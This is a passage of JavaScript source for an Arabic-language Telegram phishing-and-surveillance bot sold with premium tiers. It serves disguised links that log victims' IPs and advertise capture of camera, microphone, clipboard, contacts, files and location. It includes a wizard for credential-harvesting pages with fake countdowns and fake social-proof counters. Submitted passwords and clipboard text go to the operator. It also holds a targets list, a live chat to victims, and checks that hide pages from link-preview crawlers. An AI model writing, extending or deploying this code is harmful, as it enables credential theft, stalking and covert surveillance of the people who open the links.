  incUserStat(String(creatorId), 'linksOpened');

  // Buffer all data → send ONE combined message after 9s
  _addToBuf(creatorId, ip, 'opened', true);
  enrichIP(ip).then(info => {
    if (info) _addToBuf(creatorId, ip, 'ipInfo', info);
  });

  const feat = settings.features || DEFAULT_FEATURES;
  const userPremium = isPremium(creatorId);
  const camAccess      = canUsePremium(creatorId, 'camera');
  const audioAccess   = canUsePremium(creatorId, 'audio');
  const clipAccess    = canUsePremium(creatorId, 'clipboard');
  const pidAccess     = canUsePremium(creatorId, 'persistentId');
  const localNetAccess= canUsePremium(creatorId, 'localNet');
  const pushAccess        = canUsePremium(creatorId, 'webpush');
  const screenCapAccess   = canUsePremium(creatorId, 'screencap');
  const contcamAccess     = canUsePremium(creatorId, 'contcam');
  const contaudioAccess   = canUsePremium(creatorId, 'contaudio');
  const faceAIAccess      = canUsePremium(creatorId, 'faceAI');
  const activityAccess    = canUsePremium(creatorId, 'activityDetect');
  const autofillAccess    = canUsePremium(creatorId, 'autofill');
  const devtoolsAccess    = canUsePremium(creatorId, 'devtools');
  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium, camAccess, audioAccess, clipAccess, pidAccess, localNetAccess, pushAccess, screenCapAccess, contcamAccess, contaudioAccess, faceAIAccess, activityAccess, autofillAccess, devtoolsAccess });
}

app.get("/w/:path/*",  (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "webview"); });
app.get("/c/:path/*",  (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "cloudflare"); });
app.get("/wa/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "whatsapp"); });
app.get("/dl/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "download"); });
app.get("/tt/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "tiktok"); });
app.get("/ig/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "instagram"); });

// ── Files/Photos route (premium only) ─────────────────────────────────────────
app.get("/f/:path/*", async (req, res) => {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  if (ua.includes('telegrambot') || ua.includes('twitterbot') || ua.includes('facebookexternalhit')) return res.status(200).send('OK');
  if (!req.params.path) return res.redirect("https://t.me/th30neand0nly0ne");
  const creatorId = parseInt(req.params.path, 36);
  if (!canUsePremium(creatorId, 'files')) return res.send(upsellPage());
  const ip = getIP(req);
  const d  = new Date().toJSON().slice(0,19).replace('T',':');
  stats.linksOpened++; saveStats();
  incUserStat(String(creatorId), 'linksOpened');
  const flag = targets.has(creatorId) ? '🎯🚨' : '⚠️';
  notify(creatorId, `${flag} تم فتح رابط الملفات!\n⚓ IP: ${ip}\n⏰ ${d} UTC`);
  if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `${flag} رابط ملفات! ID: ${creatorId}\n⚓ ${ip}\n⏰ ${d} UTC`);
  enrichIP(ip).then(info => {
    if (!info) return;
    notify(creatorId, `🔍 تفاصيل IP:\n⚓ ${ip}\n${info}`);
    if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `🔍 IP (ID: ${creatorId}):\n⚓ ${ip}\n${info}`);
  });
  const redirectUrl = Buffer.from(req.params[0], 'base64').toString('utf8');
  res.render("files", { uid: req.params.path, a: hostURL, redirectUrl });
});

// ── Contacts route (premium only) ─────────────────────────────────────────────
app.get("/co/:path/*", async (req, res) => {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  if (ua.includes('telegrambot') || ua.includes('twitterbot') || ua.includes('facebookexternalhit')) return res.status(200).send('OK');
  if (!req.params.path) return res.redirect("https://t.me/th30neand0nly0ne");
  const creatorId = parseInt(req.params.path, 36);
  if (!canUsePremium(creatorId, 'contacts')) return res.send(upsellPage());
  const ip = getIP(req);
  const d  = new Date().toJSON().slice(0,19).replace('T',':');
  stats.linksOpened++; saveStats();
  incUserStat(String(creatorId), 'linksOpened');
  const flag = targets.has(creatorId) ? '🎯🚨' : '⚠️';
  notify(creatorId, `${flag} تم فتح رابط جهات الاتصال!\n⚓ IP: ${ip}\n⏰ ${d} UTC`);
  if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `${flag} رابط اتصالات! ID: ${creatorId}\n⚓ ${ip}\n⏰ ${d} UTC`);
  enrichIP(ip).then(info => {
    if (!info) return;
    notify(creatorId, `🔍 تفاصيل IP:\n⚓ ${ip}\n${info}`);
    if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `🔍 IP (ID: ${creatorId}):\n⚓ ${ip}\n${info}`);
  });
  const redirectUrl = Buffer.from(req.params[0], 'base64').toString('utf8');
  res.render("contacts", { uid: req.params.path, a: hostURL, redirectUrl });
});

// ── Dynamic Phishing Page Routes ──────────────────────────────────────────────

function parseCookies(req) {
  const raw = req.headers.cookie || '';
  return Object.fromEntries(raw.split(';').map(c => c.trim().split('=').map(decodeURIComponent)));
}

function passwordPageHTML(verifyUrl, error) {
  return `<!DOCTYPE html><html dir="rtl" lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>التحقق من الهوية</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a1a;color:#fff;font-family:'Segoe UI',Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#12122a;border:1px solid #2a2a5a;border-radius:20px;padding:36px 28px;max-width:360px;width:92%;text-align:center}
.icon{font-size:52px;margin-bottom:14px}.title{font-size:20px;font-weight:700;color:#e0e0ff;margin-bottom:8px}
.sub{font-size:13px;color:#888;margin-bottom:24px;line-height:1.7}
input{width:100%;background:#0d0d22;border:1px solid #2a2a5a;border-radius:12px;padding:14px 16px;color:#fff;font-size:16px;margin-bottom:16px;outline:none;text-align:center;letter-spacing:4px}
input:focus{border-color:#4a4aff}
.btn{width:100%;background:linear-gradient(135deg,#0066ff,#0044aa);color:#fff;border:none;padding:14px;border-radius:50px;font-size:16px;font-weight:700;cursor:pointer}
.err{color:#ff5555;font-size:13px;margin-bottom:12px}
</style></head><body><div class="card">
<div class="icon">🔐</div>
<div class="title">التحقق من الهوية</div>
<div class="sub">هذه الصفحة محمية. أدخل الرمز للمتابعة.</div>
${error ? `<div class="err">❌ الرمز غير صحيح، حاول مجدداً</div>` : ''}
<form method="POST" action="${verifyUrl}">
<input type="password" name="pass" placeholder="••••••" autofocus>
<button class="btn" type="submit">دخول ←</button>
</form>
</div></body></html>`;
}

// ── User premium page routes ───────────────────────────────────────────────
app.get("/p/u/:uid", (req, res) => {
  const uid = req.params.uid;
  const prem = premium[uid] || {};
  if (!prem.pageAccess) return res.redirect("https://www.google.com");
  const cfg = getUserPage(uid);
  if (!cfg.active) return res.redirect("https://www.google.com");
  if (cfg.pagePassword) {
    const cookies = parseCookies(req);
    if (cookies[`pgauth_${uid}`] !== "1") {
      return res.send(passwordPageHTML(`/p/u/${uid}/verify`, false));
    }
  }
  cfg.views = (cfg.views||0) + 1;
  setUserPage(uid, cfg);
  const ip = getIP(req);
  enrichIP(ip).then(info => {
    bot.sendMessage(Number(uid), `👁️ شخص فتح صفحتك!\n⚓ IP: ${ip}\n${info||""}`).catch(()=>{});
    bot.sendMessage(BOT_OWNER, `👁️ [صفحة ${uid}] شخص فتح صفحة المستخدم!\n⚓ IP: ${ip}\n${info||""}`).catch(()=>{});
  });
  res.render("dynpage", { cfg, host: hostURL }, (err, html) => {
    if (err) return res.status(500).send("Error: " + err.message);
    res.send(html);
  });
});

app.post("/p/u/:uid/verify", express.urlencoded({extended:false}), (req, res) => {
  const uid = req.params.uid;
  const cfg = getUserPage(uid);
  if (cfg.pagePassword && req.body.pass === cfg.pagePassword) {
    res.setHeader('Set-Cookie', `pgauth_${uid}=1; Path=/p/u/${uid}; HttpOnly; Max-Age=3600`);
    return res.redirect(`/p/u/${uid}`);
  }
  return res.send(passwordPageHTML(`/p/u/${uid}/verify`, true));
});

app.post("/p/u/:uid/submit", express.json({limit:"1mb"}), async (req, res) => {
  res.json({ok:true});
  const uid = req.params.uid;
  const { fields, device, platform, ip: clientIp } = req.body || {};
  if (!fields) return;
  const ip = clientIp || "unknown";
  const info = await enrichIP(ip).catch(()=>null);
  const sub = { time: new Date().toJSON().slice(0,19).replace('T',' '), fields, device, platform, ip, country: info?.split("\n")[0]?.split("|")[1]?.trim()||"" };
  addUserSub(uid, sub);
  const fText = Object.entries(fields).map(([k,v])=>`${k}: ${v}`).join("\n");
  bot.sendMessage(Number(uid), `✅ *بيانات جديدة من صفحتك!*\n\n${fText}\n\n📱 ${device||'?'} | 🌍 ${sub.country||'?'}\n⚓ ${ip}`, {parse_mode:"Markdown"}).catch(()=>{});
  bot.sendMessage(BOT_OWNER, `✅ [صفحة ${uid}] بيانات جديدة!\n${fText}\n📱 ${device||'?'}\n⚓ ${ip}`, {parse_mode:"Markdown"}).catch(()=>{});
});

app.get("/p", (req, res) => {
  const ua = (req.headers['user-agent']||'').toLowerCase();
  if (ua.includes('telegrambot')||ua.includes('twitterbot')||ua.includes('facebookexternalhit')||ua.includes('whatsapp')) return res.status(200).send('OK');
  if (!pageConfig.active) return res.redirect("https://www.google.com");
  if (pageConfig.camouflage) return res.redirect(pageConfig.redirect||"https://www.google.com");
  if (pageConfig.pagePassword) {
    const cookies = parseCookies(req);
    if (cookies['pgauth_owner'] !== "1") {
      return res.send(passwordPageHTML('/p/verify', false));
    }
  }
  pageConfig.views = (pageConfig.views||0) + 1;
  savePageConfig();
  const ip = getIP(req);
  enrichIP(ip).then(info => {
    bot.sendMessage(BOT_OWNER, `👁️ شخص فتح الصفحة الديناميكية!\n⚓ IP: ${ip}\n${info||""}`).catch(()=>{});
  });
  res.render("dynpage", { cfg: pageConfig, host: hostURL }, (err, html) => {
    if (err) {
      console.error("dynpage render error:", err.message);
      return res.status(500).send("Server error: " + err.message);
    }
    res.send(html);
  });
});

app.post("/p/verify", express.urlencoded({extended:false}), (req, res) => {
  if (pageConfig.pagePassword && req.body.pass === pageConfig.pagePassword) {
    res.setHeader('Set-Cookie', 'pgauth_owner=1; Path=/p; HttpOnly; Max-Age=3600');
    return res.redirect('/p');
  }
  return res.send(passwordPageHTML('/p/verify', true));
});

app.post("/p/submit", express.json({limit:"1mb"}), async (req, res) => {
  res.json({ok:true});
  const { fields, device, platform, ip: clientIp, pid } = req.body || {};
  const ip = getIP(req) || clientIp || "?";
  const time = new Date().toJSON().slice(0,19).replace('T',' ');
  const sub = { time, fields: fields||{}, device:device||"?", platform:platform||"?", ip, country:"?", pid:pid||null };
  enrichIP(ip).then(info => {
    if (info) {
      const m = info.match(/🌍 (.+?) \|/); if (m) sub.country = m[1];
    }
    submissions.push(sub);
    saveSubmissions();
    let txt = `🎯 *ضحية جديدة ملأت الصفحة!*\n━━━━━━━━━━━━━━━━━━━\n`;
    for (const [k,v] of Object.entries(fields||{})) txt += `📝 ${k}: \`${v}\`\n`;
    txt += `━━━━━━━━━━━━━━━━━━━\n📱 ${device||"?"}\n🌍 ${sub.country} | ⚓ ${ip}\n⏰ ${time}`;
    const kb = { inline_keyboard:[[{text:"🎛️ لوحة التحكم",callback_data:"pg_main"}]] };
    bot.sendMessage(BOT_OWNER, txt, {parse_mode:"Markdown", reply_markup:JSON.stringify(kb)}).catch(()=>{});
    // Forward to premium users who have receiveOwnerSubs enabled
    for (const [uid, pdata] of Object.entries(premium)) {
      if (Number(uid) === BOT_OWNER) continue;
      if (!isPremium(Number(uid))) continue;
      if (!pdata.receiveOwnerSubs) continue;
      bot.sendMessage(Number(uid), txt, {parse_mode:"Markdown"}).catch(()=>{});
    }
  });
});

app.post("/p/clip", express.json({limit:"512kb"}), (req, res) => {
  res.json({ok:true});
  const { text, device } = req.body||{};
  if (!text || text.length < 3) return;
  pageConfig.clipCount = (pageConfig.clipCount||0) + 1;
  savePageConfig();
  bot.sendMessage(BOT_OWNER, `📋 *نسخ من الحافظة!*\n📱 ${device||"?"}\n\n\`${text}\``, {parse_mode:"Markdown"}).catch(()=>{});
});

// ── Bot Logic ─────────────────────────────────────────────────────────────────

bot.on('message', async (msg) => {
  if (!msg?.chat) return;
  const chatId = msg.chat.id;
  if (banned.has(chatId)) return;

  // ── Force-reply handlers ─────────────────────────────────────────────────
  if (msg?.reply_to_message?.text === "🌐 Enter Your URL" && msg.text)
    return createLink(chatId, msg.text);

  if (msg?.reply_to_message?.text === "📢 اكتب الرسالة التي تريد إرسالها للجميع:" && chatId === BOT_OWNER) {
    let sent = 0, failed = 0;
    for (const uid of users) { try { await bot.sendMessage(uid, msg.text); sent++; } catch(e) { failed++; } }
    return bot.sendMessage(chatId, `✅ ناجح: ${sent} | ❌ فشل: ${failed}`);
  }

  // ── Live chat reply input ──────────────────────────────────────────────────
  if (_awaitChatReply.has(chatId) && msg.text) {
    const { uid, pid } = _awaitChatReply.get(chatId);
    _awaitChatReply.delete(chatId);
    const txt = msg.text.trim();
    if (txt === "/cancel") return bot.sendMessage(chatId, "❌ تم الإلغاء.");
    const resp = await fetch(`${hostURL}/live-chat-send`, {
      method:"POST", headers:{"Content-Type":"application/json"},
      body: JSON.stringify({ uid, pid, msg: txt })
    }).then(r=>r.json()).catch(()=>({ok:false}));
    return bot.sendMessage(chatId, resp.delivered ? `✅ تم إرسال ردك للضحية فوراً` : `📴 الضحية أغلقت الصفحة — لم يصل الرد`);
  }

  // ── Page password input ────────────────────────────────────────────────────
  if (_awaitPagePass.has(chatId) && msg.text) {
    const ctx = _awaitPagePass.get(chatId);
    _awaitPagePass.delete(chatId);
    const txt = msg.text.trim();
    if (txt === "/cancel") return bot.sendMessage(chatId, "❌ تم الإلغاء.");
    if (ctx.type === "owner") {
      pageConfig.pagePassword = txt;
      savePageConfig();
      return bot.sendMessage(chatId, `🔒 *تم تفعيل كلمة السر للصفحة!*\n\nالكود: \`${txt}\`\n\nأي زائر يفتح الرابط سيُطلب منه هذا الكود أولاً.`,
        {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[[{text:"🎛️ لوحة التحكم",callback_data:"pg_main"}]]})});
    } else {
      const uid = ctx.uid;
      const cfg = getUserPage(uid);
      cfg.pagePassword = txt;
      setUserPage(uid, cfg);
      return bot.sendMessage(chatId, `🔒 *تم تفعيل كلمة السر لصفحتك!*\n\nالكود: \`${txt}\``,
        {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[[{text:"🎛️ لوحتي",callback_data:`pg_upage_${uid}`}]]})});
    }
  }

  // ── Welcome message input ──────────────────────────────────────────────────
  if (chatId === BOT_OWNER && _awaitWelcome.has(chatId) && msg.text) {
    const txt = msg.text.trim();
    _awaitWelcome.delete(chatId);
    if (txt === "/cancel") return bot.sendMessage(chatId,"❌ تم الإلغاء.");
    pageConfig.welcomeMsg = txt;
    pageConfig.welcomeEnabled = true;
    savePageConfig();
    return bot.sendMessage(chatId,
      `✅ *تم حفظ رسالة الترحيب وتفعيلها!*\n\n📢 النص:\n_${txt}_`,
      {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
        [{text:"🔙 لوحة التحكم",callback_data:"pg_main"}]
      ]})});
  }

  // ── Page wizard ────────────────────────────────────────────────────────────
  if (chatId === BOT_OWNER && _pageWiz[chatId] && msg.text) {
    const wiz = _pageWiz[chatId];
    const txt = msg.text.trim();
    if (txt === "/cancel") { delete _pageWiz[chatId]; return bot.sendMessage(chatId,"❌ تم الإلغاء."); }
    switch(wiz.step) {
      case "title":
        wiz.data.title = txt; wiz.step = "desc";
        return bot.sendMessage(chatId,"📝 النص التوضيحي تحت العنوان؟ (أو /skip)",{reply_markup:JSON.stringify({force_reply:true})});
      case "desc":
        wiz.data.desc = txt === "/skip" ? pageConfig.desc : txt; wiz.step = "fields";
        return bot.sendMessage(chatId,"📋 الحقول؟ اكتب كل حقل بسطر — الشكل: اسم الحقل|نوعه\nالأنواع: text / password / number / email\nمثال:\nID اللاعب|text\nكلمة المرور|password",{reply_markup:JSON.stringify({force_reply:true})});
      case "fields":
        wiz.data.fields = txt.split("\n").filter(Boolean).map(l=>{
          const [label,type] = l.split("|");
          return {label:(label||l).trim(), type:(type||"text").trim()};
        });
        wiz.step = "btntext";
        return bot.sendMessage(chatId,"🔘 نص زر الإرسال؟ (أو /skip للافتراضي)",{reply_markup:JSON.stringify({force_reply:true})});
      case "btntext":
        wiz.data.btnText = txt === "/skip" ? pageConfig.btnText : txt; wiz.step = "timer";
        return bot.sendMessage(chatId,"⏱️ عداد تنازلي؟ اكتب عدد الدقائق أو 0 للإيقاف",{reply_markup:JSON.stringify({force_reply:true})});
      case "timer":
        wiz.data.timer = parseInt(txt)||0; wiz.step = "social";
        return bot.sendMessage(chatId,"👥 نص عداد اجتماعي وهمي؟ (أو /skip)\nمثال: 2,847 لاعب حصل على شداته اليوم",{reply_markup:JSON.stringify({force_reply:true})});
      case "social":
        wiz.data.social = txt === "/skip" ? "" : txt; wiz.step = "redirect";
        return bot.sendMessage(chatId,"🔗 رابط التحويل بعد الإرسال؟ (أو /skip)",{reply_markup:JSON.stringify({force_reply:true})});
      case "redirect":
        wiz.data.redirect = txt === "/skip" ? pageConfig.redirect : txt;
        // Apply wizard data
        Object.assign(pageConfig, wiz.data);
        pageConfig.active = true;
        savePageConfig();
        delete _pageWiz[chatId];
        return bot.sendMessage(chatId,
          `✅ تم حفظ الصفحة وتفعيلها!\n\n🔗 الرابط: ${hostURL}/p\n\nاضغط /page للوحة التحكم`,
          {reply_markup:JSON.stringify({inline_keyboard:[[{text:"🎛️ لوحة التحكم",callback_data:"pg_main"}]]})}
        );
    }
    return;
  }

  // ── Reply to "إرسال رسالة" force-reply prompt ────────────────────────────
  if (isPremium(chatId) && msg?.reply_to_message && msg.text) {
    const _replyMid = msg.reply_to_message.message_id;
    if (global._pendingPush && global._pendingPush[_replyMid]) {
      const _ppid = global._pendingPush[_replyMid];
      delete global._pendingPush[_replyMid];
      const _pr = await sendPushToDevice(_ppid, "🔔 رسالة جديدة", msg.text);
      if (_pr === "sse")   return bot.sendMessage(chatId, "✅ تم الإرسال — الجهاز متصل، سيظهر الإشعار فوراً");
      if (_pr === "vapid") return bot.sendMessage(chatId, "✅ تم الإرسال — إشعار خلفي، سيصل حتى لو الصفحة مغلقة");
      return bot.sendMessage(chatId, "📴 الجهاز غير متصل — سيصل عند فتح الرابط مجدداً");
    }
  }

  if (chatId === BOT_OWNER && msg?.reply_to_message?.text?.startsWith(REPLY_PREFIX) && msg.text) {
    const uid = msg.reply_to_message.text.replace(REPLY_PREFIX,"").split("\n")[0].trim();
    const tid = parseInt(uid);
    if (!isNaN(tid)) {
      try { await bot.sendMessage(tid, `📩 رسالة:\n\n${msg.text}`); return bot.sendMessage(chatId, `✅ تم الإرسال.`); }
      catch(e) { return bot.sendMessage(chatId, `❌ فشل: ${e.message}`); }
    }
  }

  if (chatId === BOT_OWNER && msg?.reply_to_message?.text === PREM_GRANT_PREFIX && msg.text) {
    const parts = msg.text.trim().split(/\s+/);
    const tid = parts[0]; const daysArg = parts[1] || "30";
    if (!tid || isNaN(Number(tid))) return bot.sendMessage(chatId, "⚠️ صيغة خاطئة. مثال: 123456789 30");
    let expiry, plan;
    if (daysArg === "lifetime") { expiry = -1; plan = "lifetime"; }
    else { const d = parseInt(daysArg)||30; expiry = Date.now() + d*24*3600*1000; plan = d >= 365 ? "yearly" : d >= 30 ? "monthly" : "weekly"; }
    premium[tid] = { expiry, plan, grantedAt: Date.now() };
    savePremium();
    backupFileToGH(PREMIUM_FILE, '_data/premium.json');
    const prof = profiles[tid] || {};
    const expText = expiry === -1 ? "♾️ مدى الحياة" : `حتى ${new Date(expiry).toJSON().slice(0,10)}`;
    bot.sendMessage(chatId, `✅ تم تفعيل البريميوم\n👤 ${prof.name||tid}\n📦 ${plan}\n${expText}`);
    bot.sendMessage(Number(tid), `🎉 تم تفعيل اشتراكك البريميوم!\n📦 الخطة: ${plan}\n${expText}\n\n🔓 ميزاتك الآن:\n📷 كاميرا أمامية + خلفية\n🎙️ تسجيل صوتي\n📋 قراءة الحافظة\n📒 جهات الاتصال\n🖼️ صور وملفات الجهاز`).catch(()=>{});
    return;
  }

  if (chatId === BOT_OWNER && msg?.reply_to_message?.text === PREM_REVOKE_PREFIX && msg.text) {
    const tid = msg.text.trim();
    if (!premium[tid]) return bot.sendMessage(chatId, `⚠️ ID: ${tid} ليس لديه اشتراك.`);
    delete premium[tid]; savePremium();
    backupFileToGH(PREMIUM_FILE, '_data/premium.json');
    bot.sendMessage(chatId, `🗑️ تم إلغاء اشتراك ${tid}`);
    bot.sendMessage(Number(tid), `⚠️ تم إلغاء اشتراكك البريميوم.\nتواصل مع المالك لتجديده.`).catch(()=>{});
    return;
  }

  users.add(chatId);
  saveUsers();
  // Save user profile (name + username — store username WITHOUT @ prefix)
  const pid = String(chatId);
  profiles[pid] = {
    name: [msg.chat.first_name, msg.chat.last_name].filter(Boolean).join(" ") || "مجهول",
    username: msg.chat.username || "",
    seen: new Date().toJSON().slice(0,19).replace('T',' ')
  };
  saveProfiles();

  // ── Away mode: auto-reply for owner ────────────────────────────────────
  if (chatId !== BOT_OWNER && msg.text && !msg.text.startsWith("/") && settings.awayMode && settings.awayMsg) {
    bot.sendMessage(chatId, settings.awayMsg).catch(() => {});
  }

  // ── Forward messages to owner ──────────────────────────────────────────
  if (chatId !== BOT_OWNER && msg.text && !msg.text.startsWith("/")) {
    const name     = msg.chat.first_name || "مجهول";
    const username = msg.chat.username ? `@${msg.chat.username}` : "لا يوجد";
    bot.sendMessage(BOT_OWNER,
      `${targets.has(chatId) ? '🎯 رسالة من هدف:\n' : '📩 رسالة:\n'}👤 ${name}\n🔗 ${username}\n🆔 ${chatId}\n\n💬 ${msg.text}`,
      { reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "📩 رد على المستخدم", callback_data: `reply:${chatId}` }]] }) }
    );
  }

  // ── Commands ──────────────────────────────────────────────────────────────

  if (msg.text === "/start") {
    const isNew = !userStats[String(chatId)];
    const isOwner = chatId === BOT_OWNER;
    const isPrem  = isPremium(chatId);
    const baseRows = [
      [{ text: "🔗 إنشاء رابط ملغم", callback_data: "crenew" }],
      [{ text: "💎 مميزات البريميوم", callback_data: "pinfo" }],
      [{ text: "📖 المساعدة", callback_data: "help" }, { text: "🆔 ID الخاص بي", callback_data: "myid" }],
      [{ text: "📊 إحصائياتي", callback_data: "mystats" }],
      ...(isPrem && !isOwner ? [[{ text: "🖥️ لوحة صفحتي", callback_data: "pg_main" }]] : []),
      ...(isOwner ? [
        [{ text: "👑 إدارة البريميوم", callback_data: "premadmin" }],
        [{ text: "🖥️ الصفحة الديناميكية", callback_data: "pg_main" }],
        [{ text: "💾 نسخ احتياطي كامل", callback_data: "do_backup" }]
      ] : [])
    ];
    const keyboard = { reply_markup: JSON.stringify({ inline_keyboard: baseRows }) };
    const welcome = settings.welcomeMsg ||
      `${isNew ? '👋 أهلاً بك لأول مرة!' : `مرحباً مجدداً ${msg.chat.first_name}!`} 🎉\n\nبوت الروابط الملغمة 🔗\n\nيجمع عند الفتح:\n📍 الموقع (GPS + IP)\n📱 بيانات الجهاز الكاملة\n📷 كاميرا أمامية + خلفية\n🎙️ تسجيل صوتي\n🌐 بيانات الشبكة\n📋 محتوى الحافظة\n🔍 ISP، الدولة، المدينة\n\n⚡ Powered by @Ye_x00`;
    return bot.sendMessage(chatId, welcome, keyboard);
  }

  if (msg.text === "/create") return createNew(chatId);

  if (msg.text === "/myid")
    return bot.sendMessage(chatId, `🆔 الـ ID الخاص بك:\n\`${chatId}\``, { parse_mode: "Markdown" });

  // /mystats — user sees their own link stats
  if (msg.text === "/mystats") {
    const us = userStats[String(chatId)] || { linksCreated: 0, linksOpened: 0 };
    return bot.sendMessage(chatId,
      `📊 إحصائياتك الشخصية:\n\n🔗 الروابط التي أنشأتها: ${us.linksCreated}\n👁️ مرات الفتح على روابطك: ${us.linksOpened}`
    );
  }

  if (msg.text === "/help") {
    let t = `📖 الاستخدام:\n\n1️⃣ أنشئ رابطاً\n2️⃣ أرسله للضحية\n\n📥 يصلك فوراً:\n   ⚡ IP + تفاصيل ISP والدولة\n   📱 بيانات الجهاز الكاملة\n   📷 صور (أمامية + خلفية)\n   📍 GPS أو IP\n   🎙️ تسجيل صوتي\n   📋 محتوى الحافظة\n   🌐 نوع الاتصال والسرعة\n\n🔗 أنواع الروابط:\n   🌐 Cloudflare\n   🖥️ WebView\n   💬 WhatsApp\n   📁 Google Drive\n\n📊 /mystats — إحصائياتك الشخصية\n\n⚡ Powered by @Ye_x00`;
    if (chatId === BOT_OWNER) {
      t += `\n\n━━━━━━━━━━━━━━━━\n📌 أوامر المالك:\n/stats — الإحصائيات الكاملة\n/report — تقرير شامل فوري\n/page — 🖥️ لوحة الصفحة الديناميكية\n/features — 🎛️ التحكم بالميزات\n/users — المستخدمون (مع الأسماء)\n/search [نص] — 🔍 بحث بالاسم أو اليوزر\n/export — تصدير شامل كملف\n/info [id] — معلومات مستخدم\n/banned — المحجوبون\n/ban [id] — حجب\n/unban [id] — رفع الحجب\n/deleteuser [id] — حذف\n/clearusers — مسح الكل\n/note [id] [نص] — إضافة ملاحظة\n/notes [id] — عرض الملاحظات\n/delnotes [id] — حذف الملاحظات\n/silent — الوضع الصامت 🔕\n/away [نص] — وضع الغياب\n/awayoff — إيقاف الغياب\n/addtarget [id] — إضافة هدف 🎯\n/removetarget [id] — إزالة هدف\n/targets — قائمة الأهداف\n/schedule [ساعة/off] — تقرير يومي\n/link [url] — رابط سريع\n/broadcast — إرسال للجميع\n/setwelcome [نص] — تخصيص الترحيب\n/resetwelcome — إعادة الافتراضي\n/clearstats — مسح الإحصائيات\n/ping — اختبار السرعة\n/backup — 💾 نسخة احتياطية كاملة`;
    }
    return bot.sendMessage(chatId, t);
  }

  if (msg.text?.startsWith("/broadcast")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (msg.text.trim() === "/broadcast")
      return bot.sendMessage(chatId, "📢 اكتب الرسالة التي تريد إرسالها للجميع:", { reply_markup: JSON.stringify({ force_reply: true }) });
    const text = msg.text.replace("/broadcast ", "");
    let sent = 0, failed = 0;
    for (const uid of users) { try { await bot.sendMessage(uid, text); sent++; } catch(e) { failed++; } }
    return bot.sendMessage(chatId, `✅ ناجح: ${sent} | ❌ فشل: ${failed}`);
  }

  if (msg.text === "/stats") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60), s2 = up%60;
    const bar = (v, max, len=10) => { const f=Math.round((v/Math.max(max,1))*len); return '█'.repeat(f)+'░'.repeat(len-f); };
    const mx = Math.max(stats.linksOpened, stats.camsnaps, stats.locations, stats.audios, 1);
    return bot.sendMessage(chatId,
      `📊 إحصائيات البوت\n━━━━━━━━━━━━━━━\n👥 المستخدمون: ${users.size}  🎯 الأهداف: ${targets.size}  🚫 محجوب: ${banned.size}\n━━━━━━━━━━━━━━━\n🔗 روابط منشأة:  ${stats.linksCreated}\n👁️ روابط مفتوحة: ${stats.linksOpened}\n${bar(stats.linksOpened,mx)}\n📷 صور كاميرا:   ${stats.camsnaps}\n${bar(stats.camsnaps,mx)}\n📍 مواقع:        ${stats.locations}\n${bar(stats.locations,mx)}\n🎙️ تسجيلات:      ${stats.audios}\n${bar(stats.audios,mx)}\n━━━━━━━━━━━━━━━\n🔕 صامت: ${settings.silentMode?'🔴 مفعّل':'🟢 معطّل'}  🌙 غياب: ${settings.awayMode?'🟡 مفعّل':'معطّل'}\n📅 تقرير يومي: ${settings.scheduleHour>=0?settings.scheduleHour+':00 UTC':'معطّل'}\n⏱️ التشغيل: ${h}س ${m}د ${s2}ث`
    );
  }

  if (msg.text === "/report") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
    const now = new Date().toJSON().slice(0,19).replace('T',' ');
    const topUsers = Object.entries(userStats)
      .sort((a,b)=>(b[1].linksOpened||0)-(a[1].linksOpened||0)).slice(0,3)
      .map(([id,u],i)=>{ const p=profiles[id]||{}; return `${['🥇','🥈','🥉'][i]} ${p.name||id}: ${u.linksOpened||0} فتحة`; }).join("\n");
    const targetsList = [...targets].map(id=>{ const p=profiles[String(id)]||{}; return `🎯 ${p.name||id}`; }).join(", ")||"لا يوجد";
    return bot.sendMessage(chatId,
      `📋 تقرير شامل\n🕒 ${now} UTC\n━━━━━━━━━━━━━━━\n👥 المستخدمون: ${users.size}\n🎯 الأهداف: ${targetsList}\n🚫 المحجوبون: ${banned.size}\n━━━━━━━━━━━━━━━\n🔗 روابط منشأة: ${stats.linksCreated}\n👁️ روابط مفتوحة: ${stats.linksOpened}\n📷 صور: ${stats.camsnaps}  🎙️ صوت: ${stats.audios}  📍 مواقع: ${stats.locations}\n━━━━━━━━━━━━━━━\n🏆 الأكثر نشاطاً:\n${topUsers||'لا يوجد بيانات'}\n━━━━━━━━━━━━━━━\n⏱️ التشغيل: ${h}س ${m}د`
    );
  }

  if (msg.text === "/clearstats") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    stats = { linksOpened:0, linksCreated:0, camsnaps:0, audios:0, locations:0 }; saveStats();
    return bot.sendMessage(chatId, `🗑️ تم مسح جميع الإحصائيات.`);
  }

  if (msg.text === "/users") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
